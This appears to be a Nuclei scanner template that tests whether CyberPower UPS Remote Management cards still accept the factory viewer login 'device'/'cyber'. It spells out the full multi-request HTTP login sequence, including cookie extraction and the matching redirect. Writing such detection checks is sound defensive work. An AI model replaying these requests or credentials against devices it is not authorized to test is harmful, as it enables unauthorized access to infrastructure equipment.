id: cyber-power-ups-remote-management-default-login

info:
  name: CyberPower UPS Remote Management - Default Login
  author: mr-pmillz
  severity: medium
  description: |
    CyberPower UPS Remote Management accepts the default device/cyber credentials for its viewer account when the factory password has not been changed.
  impact: |
    An attacker can obtain read-only access to UPS status and configuration information exposed to the viewer account.
  remediation: |
    Change the viewer account's default password or disable the account when it is not needed, and restrict management access to trusted networks.
  reference:
    - https://dl4jz3rbrsfum.cloudfront.net/documents/CyberPower_GU_RMCARD202.pdf
  classification:
    cwe-id: CWE-1392
  metadata:
    vendor: cyberpower
    product: remote_management_card
  tags: default-login,cyberpower,ups,intrusive

flow: http(1) && http(2) && http(3) && http(4) && http(5) && http(6)

http:
  - raw:
      - |
        POST /login_pass.cgi HTTP/1.1
        Host: {{Hostname}}
        Cache-Control: max-age=0
        Origin: http://{{Hostname}}
        Content-Type: application/x-www-form-urlencoded
        Referer: http://{{Hostname}}/login.html

        username={{username}}&password={{password}}&save_cookie=on&action=LOGIN

    payloads:
      username:
        - device
      password:
        - cyber
    attack: pitchfork

  - raw:
      - |
        GET /login_pass.html HTTP/1.1
        Host: {{Hostname}}
        Cache-Control: max-age=0
        Referer: http://{{Hostname}}/login.html

    extractors:
      - type: kval
        name: cocp
        internal: true
        part: header
        kval:
          - cocp

  - raw:
      - |
        GET /login_counter.html?stap=0 HTTP/1.1
        Host: {{Hostname}}
        Referer: http://{{Hostname}}/login_pass.html

  - raw:
      - |
        GET /login_counter.html?stap=1 HTTP/1.1
        Host: {{Hostname}}
        Referer: http://{{Hostname}}/login_pass.html

  - raw:
      - |
        GET /login_counter.html?stap=2 HTTP/1.1
        Host: {{Hostname}}
        Referer: http://{{Hostname}}/login_pass.html

  - raw:
      - |
        GET /login.cgi?action=LOGIN&save_cookie=on HTTP/1.1
        Host: {{Hostname}}
        Referer: http://{{Hostname}}/login.html
        Cookie: cocp={{cocp}}

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 303
      - type: regex
        part: header
        regex:
          - "Location:\\s(http|https):\\/\\/([a-zA-Z0-9.-]+|(\\d{1,3}\\.){3}\\d{1,3})\\/summary.html"
